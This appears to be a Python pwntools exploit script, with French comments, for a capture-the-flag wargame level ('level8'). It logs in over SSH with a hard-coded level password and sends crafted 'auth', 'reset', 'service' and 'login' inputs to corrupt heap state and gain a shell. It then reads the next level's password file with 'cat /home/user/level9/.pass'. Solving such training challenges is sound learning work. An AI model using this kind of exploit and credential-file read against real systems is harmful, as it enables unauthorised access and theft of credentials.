#!/usr/bin/env python3
from pwn import *
import base64
import os

from pwnlib.adb import shell

# Configuration
context.arch = 'i386'  # Architecture du binaire (32-bit)
context.log_level = 'info'  # Niveau de log (debug, info, warning, error)

# Variables pour la connexion
LOCAL = False  # Mettre à False pour l'exploitation SSH
HOST = "localhost"  # Hôte pour SSH
PORT = 8881  # Port pour SSH
USER = "level8"  # Nom d'utilisateur SSH
PASSWORD = "5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9"  # Mot de passe SSH
SSH_SESSION = None


def get_connection(custom_env=None, argv=None):
    global SSH_SESSION
    # Fonction helper pour fusionner les environnements
    def merge_env(base_env, custom_env):
        if custom_env:
            base_env.update(custom_env)
        return base_env

    if LOCAL:
        # En local, on utilise l'environnement actuel comme base
        SSH_SESSION = None
        local_env = os.environ.copy()
        final_env = merge_env(local_env, custom_env)
        final_argv = argv if argv is not None else ['./Resources/' + USER]
        return process(final_argv, env=final_env)
    else:
        shell = ssh(host=HOST, port=PORT, user=USER, password=PASSWORD)
        SSH_SESSION = shell
        # Récupérer l'environnement distant
        remote_env = shell.run('env').recvall().decode().strip()
        # Convertir l'output en dictionnaire
        remote_env_dict = dict(line.split('=', 1) for line in remote_env.split('\n') if '=' in line)

        # Fusionner avec nos variables personnalisées 
        final_env = merge_env(remote_env_dict, custom_env)
        final_argv = argv if argv is not None else ['/home/user/' + USER + '/' + USER]
        log.info(f"Final argv: {final_argv}")
        return shell.process(final_argv, env=final_env)


def exploit():



    conn = get_connection()


    output = conn.recvuntil(b'\n')
    print(output.decode(errors='ignore').strip())
    to_send = b'auth ' + b'A' * 5
    print(to_send.decode(errors='ignore'))
    conn.sendline(to_send)

    output = conn.recvuntil(b'\n')
    print(output.decode(errors='ignore').strip())
    to_send = b'reset'
    print(to_send.decode(errors='ignore'))
    conn.sendline(to_send)

    output = conn.recvuntil(b'\n')
    print(output.decode(errors='ignore').strip())
    to_send = b'service ' + b'a' * 69
    print(to_send.decode(errors='ignore'))
    conn.sendline(to_send)

    output = conn.recvuntil(b'\n')
    print(output.decode(errors='ignore').strip())
    to_send = b'login'
    print(to_send.decode(errors='ignore'))
    conn.sendline(to_send)

    conn.recvuntil(b'$')
    conn.sendline(b'cat /home/user/level9/.pass')
    flag = conn.recvline()
    print("\n=== Flag ===")
    print(flag.decode(errors='ignore').strip())


    conn.interactive()

    
if __name__ == "__main__":
    exploit()
